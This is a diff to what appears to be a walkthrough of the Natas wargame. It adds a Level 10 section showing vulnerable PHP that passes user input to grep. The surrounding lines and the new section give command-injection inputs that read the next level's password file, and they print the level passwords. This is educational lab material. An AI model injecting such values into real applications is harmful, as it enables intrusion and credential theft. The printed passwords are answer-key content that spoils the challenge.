@@ -64,3 +64,17 @@ In this level we can search for a word from dictonary.txt.  Looking at the sourc
 it has a command injection vulnearbility. So if we type `; cat /etc/natas_webpass/natas10 #`. We get the password to the next level.
 
 password is `D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE`
+
+# Level 10
+In this level we can search for a word from dictonary.txt.  Looking at the source we can understand that we cannot use `/[;|&]/`
+```
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+```
+So We use a wild card.Then if we type `.* /etc/natas_webpass/natas11 #`. We get the password to the next level.
+
+password is `1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`
+
